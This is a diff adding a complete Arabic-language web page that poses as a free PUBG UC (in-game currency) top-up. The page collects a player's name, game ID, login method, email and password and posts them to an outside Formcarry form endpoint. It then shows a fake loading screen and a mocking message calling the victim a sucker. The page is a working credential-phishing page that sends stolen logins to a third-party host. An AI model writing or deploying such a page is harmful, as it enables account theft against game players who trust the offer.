@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>شحن شدات PUBG</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding: 30px;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      color: #f0e9ff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    h1, h2 {
+      text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .btn {
+      padding: 15px 30px;
+      margin: 15px auto;
+      background: linear-gradient(145deg, #6a11cb, #2575fc);
+      color: white;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 1.2rem;
+      box-shadow:
+        0 4px 6px rgba(101, 75, 255, 0.5),
+        0 0 15px rgba(101, 75, 255, 0.7);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      perspective: 800px;
+      transform-style: preserve-3d;
+    }
+
+    .btn:hover {
+      transform: translateZ(10px) scale(1.05);
+      box-shadow:
+        0 8px 12px rgba(101, 75, 255, 0.8),
+        0 0 25px rgba(101, 75, 255, 1);
+    }
+
+    input, button, select {
+      margin: 10px auto;
+      padding: 12px;
+      border-radius: 12px;
+      width: 80%;
+      max-width: 400px;
+      font-size: 1rem;
+      border: none;
+      outline: none;
+      box-shadow:
+        inset 0 0 8px rgba(255, 255, 255, 0.2);
+      background: rgba(255, 255, 255, 0.15);
+      color: #eee;
+      transition: background 0.3s ease, box-shadow 0.3s ease;
+      display: block;
+      direction: rtl;
+      text-align: right;
+      font-weight: 600;
+    }
+
+    input::placeholder, select {
+      color: #ccc;
+      font-weight: 500;
+    }
+
+    input:focus, select:focus {
+      background: rgba(255, 255, 255, 0.35);
+      box-shadow:
+        0 0 12px rgba(101, 75, 255, 0.9);
+      color: #fff;
+    }
+
+    .box {
+      border: 3px solid #a354ff;
+      padding: 30px 40px;
+      border-radius: 20px;
+      display: inline-block;
+      background: linear-gradient(145deg, #2c1f42, #4b3a72);
+      color: #cdb4db;
+      font-size: 2rem;
+      font-weight: 900;
+      text-shadow: 2px 2px 10px #9b59b6;
+      box-shadow:
+        0 8px 20px rgba(155, 89, 182, 0.8),
+        inset 0 0 15px #8e44ad;
+      perspective: 700px;
+      transform-style: preserve-3d;
+      user-select: none;
+      transition: transform 0.3s ease;
+    }
+
+    .box:hover {
+      transform: rotateY(10deg) rotateX(5deg) scale(1.05);
+      box-shadow:
+        0 12px 25px rgba(155, 89, 182, 1),
+        inset 0 0 25px #8e44ad;
+    }
+
+    .password-wrapper {
+      position: relative;
+      display: inline-block;
+      width: 80%;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+   .toggle-password {
+  position: absolute;
+  left: -300px; /* بدلاً من left: -300px; */
+  top: 50%;
+  transform: translateY(-100%);
+  background: rgba(255, 255, 255, 0.2);
+  border: none;
+  cursor: pointer;
+  font-size: 26px;
+  color: #6a11cb;
+  padding: 5px 10px;
+  border-radius: 50%;
+  box-shadow: 0 0 8px #6a11cb;
+  transition: background 0.3s ease, color 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+
+    .toggle-password:hover {
+      background: #6a11cb;
+      color: #fff;
+      box-shadow: 0 0 15px #9b59b6;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- شاشة اختيار الشدات -->
+  <div id="chooseUC">
+    <h1>اختر عدد الشدات</h1>
+    <button class="btn" onclick="selectUC(60)">60 UC</button>
+  </div>
+
+  <!-- شاشة نموذج البيانات -->
+  <div id="formSection" class="hidden">
+    <h2>ادخل بيانات حسابك</h2>
+    <form id="ucForm">
+      <input type="text" name="name" placeholder="اسمك داخل اللعبة" required /><br />
+      <input type="text" name="id" placeholder="رقم ID الخاص بك" required /><br />
+      <select name="login_method" required>
+        <option value="">اختر طريقة تسجيل الدخول</option>
+        <option value="فيس بوك">فيس بوك</option>
+        <option value="تويتر">تويتر</option>
+        <option value="بريد إلكتروني">بريد إلكتروني</option>
+      </select><br />
+      <input type="email" name="email" placeholder="بريدك الإلكتروني" /><br />
+      <div class="password-wrapper">
+        <input type="password" name="password" placeholder="ادخل كلمة المرور" id="passwordInput" />
+        <button type="button" class="toggle-password" onclick="togglePassword()">🙈</button>
+      </div>
+      <input type="hidden" name="uc" id="ucAmount" /><br />
+      <button type="submit" class="btn">تأكيد</button>
+    </form>
+  </div>
+
+  <!-- شاشة الانتظار -->
+  <div id="loading" class="hidden">
+    <h2>جارٍ شحن الشدات...</h2>
+    <p>الرجاء الانتظار لحظات...</p>
+  </div>
+
+  <!-- شاشة المقلب -->
+  <div id="prank" class="hidden">
+    <div class="box">
+      <h1>تسلم يا مغفل 😂</h1>
+    </div>
+  </div>
+
+  <script>
+    function selectUC(amount) {
+      document.getElementById("chooseUC").classList.add("hidden");
+      document.getElementById("formSection").classList.remove("hidden");
+      document.getElementById("ucAmount").value = amount;
+    }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById("passwordInput");
+      const toggleBtn = document.querySelector(".toggle-password");
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        toggleBtn.textContent = "🐵";
+      } else {
+        passwordInput.type = "password";
+        toggleBtn.textContent = "🙈";
+      }
+    }
+
+    document.getElementById("ucForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+
+      // إرسال البيانات إلى Formcarry
+      fetch("https://formcarry.com/s/cRc2MFChA04", {
+        method: "POST",
+        body: formData,
+        headers: { Accept: "application/json" },
+      }).then((response) => {
+        if (response.ok) {
+          document.getElementById("formSection").classList.add("hidden");
+          document.getElementById("loading").classList.remove("hidden");
+
+          setTimeout(() => {
+            document.getElementById("loading").classList.add("hidden");
+            document.getElementById("prank").classList.remove("hidden");
+          }, 5000);
+        } else {
+          alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
